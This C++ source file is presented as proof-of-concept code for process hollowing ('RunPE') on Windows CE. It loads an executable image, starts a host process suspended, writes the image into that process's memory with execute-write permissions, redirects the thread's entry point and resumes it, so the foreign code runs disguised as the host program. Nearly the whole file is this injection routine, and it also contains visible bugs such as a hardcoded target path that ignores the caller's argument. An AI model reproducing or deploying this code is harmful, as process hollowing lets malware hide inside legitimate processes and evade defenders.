// Authors:
// Vrillon at gamedeception.net
// Galco at rohitab.com
// Proof-Of-Concept Code
// Alexey Kasyanchuk <degitx@gmail.com>

#include "stdafx.h"
#include "creatememoryprocessce.h"
#include <cstdio>
#include <tlhelp32.h>

typedef DWORD (__stdcall* NtUnmapViewOfSectionF)(HANDLE,PVOID);
NtUnmapViewOfSectionF NtUnmapViewOfSection = (NtUnmapViewOfSectionF)GetProcAddress(LoadLibrary(_T("ntdll.dll")), _T("NtUnmapViewOfSection"));

DWORD VirtualQueryEx(HANDLE hProcess, LPVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength)
{
	HINSTANCE coreDll = LoadLibrary(L"coredll.dll");
	typedef LPVOID (*MapPtrToProcess_)(LPVOID, HANDLE);
	MapPtrToProcess_ MapPtrToProcess = (MapPtrToProcess_)GetProcAddress(coreDll, L"MapPtrToProcess");
	typedef DWORD (*GetCurrentPermissions_)(void);
	GetCurrentPermissions_ GetCurrentPermissions = (GetCurrentPermissions_)GetProcAddress(coreDll, L"GetCurrentPermissions");
    typedef DWORD (*SetProcPermissions_)(DWORD);
	SetProcPermissions_ SetProcPermissions = (SetProcPermissions_)GetProcAddress(coreDll, L"SetProcPermissions");
	FreeLibrary(coreDll);
	LPVOID _lpAddress;
    //if(GetCurrentPermissions()!=0xFFFFFFFF)
	//	SetProcPermissions(0xFFFFFFFF);
    if(!(_lpAddress = MapPtrToProcess(lpAddress,hProcess)))
		return 0;

    return VirtualQuery(_lpAddress, lpBuffer, dwLength);
}

BOOL VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
{
	HINSTANCE coreDll = LoadLibrary(L"coredll.dll");
	typedef LPVOID (*MapPtrToProcess_)(LPVOID, HANDLE);
	MapPtrToProcess_ MapPtrToProcess = (MapPtrToProcess_)GetProcAddress(coreDll, L"MapPtrToProcess");
	typedef DWORD (*GetCurrentPermissions_)(void);
	GetCurrentPermissions_ GetCurrentPermissions = (GetCurrentPermissions_)GetProcAddress(coreDll, L"GetCurrentPermissions");
    typedef DWORD (*SetProcPermissions_)(DWORD);
	SetProcPermissions_ SetProcPermissions = (SetProcPermissions_)GetProcAddress(coreDll, L"SetProcPermissions");
	FreeLibrary(coreDll);
	LPVOID _lpAddress;
    if(GetCurrentPermissions()!=0xFFFFFFFF)
		SetProcPermissions(0xFFFFFFFF);
    if(!(_lpAddress = MapPtrToProcess(lpAddress,hProcess)))
		return 0;

    return VirtualProtect(_lpAddress, dwSize, flNewProtect, lpflOldProtect);
}
LPVOID VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD flAllocationType, DWORD flProtect)
{
	HINSTANCE coreDll = LoadLibrary(L"coredll.dll");
	typedef LPVOID (*MapPtrToProcess_)(LPVOID, HANDLE);
	MapPtrToProcess_ MapPtrToProcess = (MapPtrToProcess_)GetProcAddress(coreDll, L"MapPtrToProcess");
	typedef DWORD (*GetCurrentPermissions_)(void);
	GetCurrentPermissions_ GetCurrentPermissions = (GetCurrentPermissions_)GetProcAddress(coreDll, L"GetCurrentPermissions");
    typedef DWORD (*SetProcPermissions_)(DWORD);
	SetProcPermissions_ SetProcPermissions = (SetProcPermissions_)GetProcAddress(coreDll, L"SetProcPermissions");
	FreeLibrary(coreDll);
	LPVOID _lpAddress;
    //if(GetCurrentPermissions()!=0xFFFFFFFF)
	//	SetProcPermissions(0xFFFFFFFF);
    if(!(_lpAddress = MapPtrToProcess(lpAddress,hProcess)))
		return 0;

    return VirtualAlloc(_lpAddress, dwSize, flAllocationType, flProtect);
}

BOOL VirtualFreeEx(HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD dwFreeType)
{
	HINSTANCE coreDll = LoadLibrary(L"coredll.dll");
	typedef LPVOID (*MapPtrToProcess_)(LPVOID, HANDLE);
	MapPtrToProcess_ MapPtrToProcess = (MapPtrToProcess_)GetProcAddress(coreDll, L"MapPtrToProcess");
	typedef DWORD (*GetCurrentPermissions_)(void);
	GetCurrentPermissions_ GetCurrentPermissions = (GetCurrentPermissions_)GetProcAddress(coreDll, L"GetCurrentPermissions");
    typedef DWORD (*SetProcPermissions_)(DWORD);
	SetProcPermissions_ SetProcPermissions = (SetProcPermissions_)GetProcAddress(coreDll, L"SetProcPermissions");
	FreeLibrary(coreDll);
	LPVOID _lpAddress;
    //if(GetCurrentPermissions()!=0xFFFFFFFF)
	//	SetProcPermissions(0xFFFFFFFF);
    if(!(_lpAddress = MapPtrToProcess(lpAddress,hProcess)))
		return 0;

    return VirtualFree(_lpAddress, dwSize, dwFreeType);
}

typedef struct _MODULEINFO {
  LPVOID lpBaseOfDll;
  DWORD  SizeOfImage;
  LPVOID EntryPoint;
} MODULEINFO, *LPMODULEINFO;

BOOL GetModuleInformation(HANDLE hProcess, HMODULE hModule, LPMODULEINFO lpmodinfo, DWORD cb)
{
	HINSTANCE coreDll = LoadLibrary(L"coredll.dll");
	typedef BOOL (*GetModuleInformation_)(HANDLE, HMODULE, LPMODULEINFO, DWORD);
	GetModuleInformation_ fGetModuleInformation = (GetModuleInformation_)GetProcAddress(coreDll, L"GetModuleInformation");
	FreeLibrary(coreDll);
	return fGetModuleInformation(hProcess, hModule, lpmodinfo, cb);
}

BOOL ListProcessModules( DWORD dwPID )
{
  HANDLE hModuleSnap = INVALID_HANDLE_VALUE;
  MODULEENTRY32 me32;

  // Take a snapshot of all modules in the specified process.
  hModuleSnap = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, dwPID );
  if( hModuleSnap == INVALID_HANDLE_VALUE )
  {
    printf( "CreateToolhelp32Snapshot (of modules)" );
    return( FALSE );
  }

  // Set the size of the structure before using it.
  me32.dwSize = sizeof( MODULEENTRY32 );

  // Retrieve information about the first module,
  // and exit if unsuccessful
  if( !Module32First( hModuleSnap, &me32 ) )
  {
    printf( "Module32First" );  // show cause of failure
    CloseHandle( hModuleSnap );           // clean the snapshot object
    return( FALSE );
  }

  // Now walk the module list of the process,
  // and display information about each module
  do
  {
    _tprintf( TEXT("\n\n     MODULE NAME:     %s"),   me32.szModule );
    _tprintf( TEXT("\n     Executable     = %s"),     me32.szExePath );
    _tprintf( TEXT("\n     Process ID     = 0x%08X"),         me32.th32ProcessID );
    _tprintf( TEXT("\n     Ref count (g)  = 0x%04X"),     me32.GlblcntUsage );
    _tprintf( TEXT("\n     Ref count (p)  = 0x%04X"),     me32.ProccntUsage );
    _tprintf( TEXT("\n     Base address   = 0x%08X"), (DWORD) me32.modBaseAddr );
    _tprintf( TEXT("\n     Base size      = %d"),             me32.modBaseSize );

  } while( Module32Next( hModuleSnap, &me32 ) );

  CloseHandle( hModuleSnap );
  return( TRUE );
}

bool WINAPI CreateMemoryProcess(
								LPVOID lpImage,
								char* pPath
								)
{
	// Variables for Process Forking
	/////////////////////////////////////////////////////////////////
	DWORD                lWritten;
	DWORD                lImageSize;
	DWORD                lImageBase;
	DWORD                lImageHeaderSize;
	DWORD                lFirstSection;
	DWORD                lJumpSize = 0;
	DWORD                lSectionCount;
	DWORD                lSectionSize;
	DWORD                lPreviousProtection;

	LPVOID                  lpImageMemory;

    IMAGE_DOS_HEADER        dsDosHeader;
    IMAGE_NT_HEADERS        ntNtHeader;
    IMAGE_SECTION_HEADER    shSections[512 * 2];

    PROCESS_INFORMATION     piProcessInformation;
    STARTUPINFO             suStartUpInformation;
    CONTEXT                 cContext;
	DWORD					lProccessBaseAdress;
	DWORD					lProccessImageSize;
	DWORD					lProccessEntryPoint;

	wchar_t*                   pProcessName = new wchar_t[400];
	ZeroMemory(pProcessName, sizeof(pProcessName));
	bool					bIsNewProccessName = false;
	bool					bReturnValue = false;
    /////////////////////////////////////////////////////////////////
    // End Variable Definition
	
	if(strlen(pPath) == 0)
	{
		// No process name is set. Trying to fork this process
		pProcessName = new  wchar_t[MAX_PATH];
		ZeroMemory(pProcessName, MAX_PATH);
		bIsNewProccessName = true;

#ifdef CPDEBUG
			printf("Trying to fork same process file\n");
#endif
		// Get the file name for the dummy process
		if(GetModuleFileName(NULL, pProcessName, MAX_PATH) == 0)
		{
#ifdef CPDEBUG
			printf("Error: Can't recive GetModuleFileName() from proccess.\n");
#endif
			delete [] pProcessName;
			return bReturnValue;
		}
	}
	else
	{
		mbstowcs(pProcessName, pPath, strlen(pPath));
	}
    
#ifdef CPDEBUG
	printf("Using %s for injection\n", pProcessName);
#endif

    // Grab the DOS Headers
    memcpy(&dsDosHeader, lpImage, sizeof(dsDosHeader));
    if(dsDosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    {
#ifdef CPDEBUG
		printf("Error: File DOS header wrong\n");
#endif
		if(bIsNewProccessName)
			delete [] pProcessName;
        return false;
    }

    // Grab NT Headers
	memcpy(&ntNtHeader, (LPVOID)((DWORD)lpImage + dsDosHeader.e_lfanew), sizeof(ntNtHeader));
    if(ntNtHeader.Signature != IMAGE_NT_SIGNATURE)
    {
#ifdef CPDEBUG
		printf("Error: No NT Signature finded.\n");
#endif
		if(bIsNewProccessName)
			delete [] pProcessName;
        return false;
    }

    // Get Size and Image Base
	lImageBase = ntNtHeader.OptionalHeader.ImageBase;
	lImageSize = ntNtHeader.OptionalHeader.SizeOfImage;
    lImageHeaderSize = ntNtHeader.OptionalHeader.SizeOfHeaders;
#ifdef CPDEBUG
		printf("New image base = 0x%08X\n", lImageBase);
		printf("New image size = %d\n", lImageSize);
		printf("New image header size = %d\n", lImageHeaderSize);
#endif

    // Allocate memory for image
    lpImageMemory = new LPVOID[lImageSize];
    ZeroMemory(lpImageMemory, lImageSize);

    lFirstSection = (DWORD)(((DWORD)lpImage + dsDosHeader.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
    
    memcpy(shSections, (LPVOID)(lFirstSection), sizeof(IMAGE_SECTION_HEADER) * ntNtHeader.FileHeader.NumberOfSections);
#ifdef CPDEBUG
		printf("%d header sections founded\n", ntNtHeader.FileHeader.NumberOfSections);
#endif
	memcpy(lpImageMemory, lpImage, lImageHeaderSize);

    // Get Section Alignment
    if((ntNtHeader.OptionalHeader.SizeOfHeaders % ntNtHeader.OptionalHeader.SectionAlignment) == 0)
    {
        lJumpSize = ntNtHeader.OptionalHeader.SizeOfHeaders;
    }
    else
    {
        lJumpSize = ntNtHeader.OptionalHeader.SizeOfHeaders / ntNtHeader.OptionalHeader.SectionAlignment;
        lJumpSize += 1;
        lJumpSize *= ntNtHeader.OptionalHeader.SectionAlignment;
    }

    LPVOID lpImageMemoryDummy = (LPVOID)((DWORD)lpImageMemory + lJumpSize);

    // Copy Sections To Buffer
    for(lSectionCount = 0; lSectionCount < ntNtHeader.FileHeader.NumberOfSections; lSectionCount++)
    {
        lJumpSize = 0;
        lSectionSize = shSections[lSectionCount].SizeOfRawData;
        
        memcpy(lpImageMemoryDummy, (LPVOID)((DWORD)lpImage + shSections[lSectionCount].PointerToRawData), lSectionSize);

        if((shSections[lSectionCount].Misc.VirtualSize % ntNtHeader.OptionalHeader.SectionAlignment) == 0)
        {
            lJumpSize = shSections[lSectionCount].Misc.VirtualSize;
        }
        else
        {
            lJumpSize  = shSections[lSectionCount].Misc.VirtualSize / ntNtHeader.OptionalHeader.SectionAlignment;
            lJumpSize += 1;
            lJumpSize *= ntNtHeader.OptionalHeader.SectionAlignment;
        }

        lpImageMemoryDummy = (LPVOID)((DWORD)lpImageMemoryDummy + lJumpSize);
    }

    ZeroMemory(&suStartUpInformation, sizeof(STARTUPINFO));
    ZeroMemory(&piProcessInformation, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&cContext, sizeof(CONTEXT));

    suStartUpInformation.cb = sizeof(suStartUpInformation);

    // Create Process
    if(CreateProcess(
					L"/Program Files/simpleapp/simpleapp.exe",
					NULL,
					NULL,
					NULL,
					false,
					CREATE_SUSPENDED,
					NULL,
					NULL,
					&suStartUpInformation,
					&piProcessInformation
					))
    {
#ifdef CPDEBUG
			printf("Proccess suspended\n");
#endif
        cContext.ContextFlags = CONTEXT_FULL;
        if(!GetThreadContext(piProcessInformation.hThread,&cContext))
		{
#ifdef CPDEBUG
			printf("Fail to get context of suspended proccess.\n");
#endif
			TerminateProcess(piProcessInformation.hProcess, 0);
			if(bIsNewProccessName)
				delete [] pProcessName;
            delete [] lpImageMemory;
            return false;
			return true;
		}

		ListProcessModules(piProcessInformation.dwProcessId);
		MODULEINFO mi;
		ZeroMemory(&mi, sizeof(mi));
		GetModuleInformation(piProcessInformation.hProcess, NULL, &mi, sizeof(mi));
		lProccessBaseAdress = (DWORD)mi.lpBaseOfDll;
		lProccessImageSize = mi.SizeOfImage;
		lProccessEntryPoint = (DWORD)mi.EntryPoint;

#ifdef CPDEBUG
		printf("Current entry point = 0x%08X\n", lProccessEntryPoint);
		printf("Current image base adress = 0x%08X\n", lProccessBaseAdress);
		printf("Current image size = %d\n", lProccessImageSize);
#endif

		//printf("Test point = 0x%08X\n", cContext.R1);

        // Check image base and image size
        if(lImageBase == lProccessBaseAdress && lImageSize <= lProccessImageSize)
        {
			// we can load new image to same place
#ifdef CPDEBUG
		printf("Using same image place\n");
#endif
            if(!VirtualProtect(
								//piProcessInformation.hProcess,
								(LPVOID)lImageBase,
								lImageSize,
								PAGE_EXECUTE_READWRITE,
								(DWORD*)&lPreviousProtection
							))
			{
				printf("Error: Can't change protection. Error: %d\n", GetLastError());
			}
        }
        else
        {
			// We can't use same place, allocate memory for it.
#ifdef CPDEBUG
			printf("Allocation place for new image\n");
#endif
          //  if(NtUnmapViewOfSection(
			//							piProcessInformation.hProcess,
			//							(LPVOID)lProccessBaseAdress
			//						) == 0)
			//{
#ifdef CPDEBUG
					printf("Old section unmaped\n");
#endif
					LPVOID lpIsAllocated = VirtualAllocEx(
											piProcessInformation.hProcess,
											(LPVOID)lImageBase,
											lImageSize,
											MEM_COMMIT | MEM_RESERVE,
											PAGE_EXECUTE_READWRITE
									);
					if(lpIsAllocated)
					{
#ifdef CPDEBUG
						printf("Memory allocated successful\n");
#endif
					}
					else
					{
#ifdef CPDEBUG
						printf("Error: Can't allocated\n");
#endif
					}
		//	}
		//	else
		//	{
#ifdef CPDEBUG
		//		printf("Error: Can't unmap old section\n");
#endif
		//	}
        }

        // Write Image to Process
        if(WriteProcessMemory(
								piProcessInformation.hProcess,
								(LPVOID)lImageBase,
								lpImageMemory,
								lImageSize,
								(DWORD*)&lWritten
							))
        {
            bReturnValue = true;
#ifdef CPDEBUG
		printf("New image written\n");
#endif
        }
		else
		{
#ifdef CPDEBUG
			printf("Error: New image written error. Error: %d\n", GetLastError());
#endif
		}

        // Set Image Base
        if(WriteProcessMemory(
								piProcessInformation.hProcess,
								//(LPVOID)((DWORD)cContext.Ebx + 8),
								(LPVOID)((DWORD)lProccessBaseAdress + 0x54),
								&lImageBase,
								4,
								(DWORD*)&lWritten)
							)
        {
#ifdef CPDEBUG
			printf("Updated init point\n");
#endif
        }
		else
		{
			bReturnValue = false;
#ifdef CPDEBUG
			printf("Error: Can't update init point\n");
#endif
		}

        if(!bReturnValue)
        {
#ifdef CPDEBUG
			printf("Error: Error during image rewriting. Exit.\n");
#endif
			if(bIsNewProccessName)
				delete [] pProcessName;
            delete [] lpImageMemory;
            return false;
        }

        // Set the new entry point
        //cContext.Eax = lImageBase + ntNtHeader.OptionalHeader.AddressOfEntryPoint;
		lProccessEntryPoint = (cContext.Pc = lImageBase + ntNtHeader.OptionalHeader.AddressOfEntryPoint);

        SetThreadContext(
						piProcessInformation.hThread,
						&cContext
						);

		if(lImageBase == lProccessBaseAdress && lImageSize <= lProccessImageSize)
		{
#ifdef CPDEBUG
			printf("Returning old protection for new image.\n");
#endif
            VirtualProtectEx(
								piProcessInformation.hProcess,
								(LPVOID)lImageBase,
								lImageSize,
								lPreviousProtection,
								0
								);
		}
        // Resume the process
        ResumeThread(piProcessInformation.hThread);
    }
	else
	{
#ifdef CPDEBUG
		printf("Error: Can't start %s\n", pProcessName);
#endif
		return false;
	}

	if(bIsNewProccessName)
		delete [] pProcessName;
    delete [] lpImageMemory;

	if(bReturnValue)
	{
#ifdef CPDEBUG
			printf("Successful injected. No errors during doing this.\n");
#endif
	}

    return bReturnValue;
}

bool WINAPI CreateMemoryProcessFromFile(char* fPath, char* fInjected)
{
		// Defenitions
		FILE*                   fFile;
		DWORD                lFileSize;
		LPVOID                  lpMemoryFile;

#ifdef CPDEBUG
		printf("Reading %s file\n", fPath);
#endif
		// Open the dummy process in binary mode
		fFile = fopen(fPath, "rb");
		if(!fFile)
		{
#ifdef CPDEBUG
			printf("Error: Can't open file\n");
#endif
			return false;
		}

		fseek(fFile, 0, SEEK_END);

		// Get file size
		lFileSize = ftell(fFile);
#ifdef CPDEBUG
		printf("File size: %d\n", lFileSize);
#endif
		//rewind(fFile);
		fseek(fFile, 0, SEEK_SET);

		// Allocate memory for dummy file
		lpMemoryFile = new LPVOID[lFileSize];
		ZeroMemory(lpMemoryFile, lFileSize);

		// Read memory of file
		fread(lpMemoryFile, lFileSize, 1, fFile);

		// Close file
		fclose(fFile);

#ifdef CPDEBUG
			printf("File reading done\n");
#endif

		if(CreateMemoryProcess(
										lpMemoryFile,
										fInjected
									))
		{
			delete [] lpMemoryFile;
			return true;
		}
		else
		{
			delete [] lpMemoryFile;
			return false;
		}
}

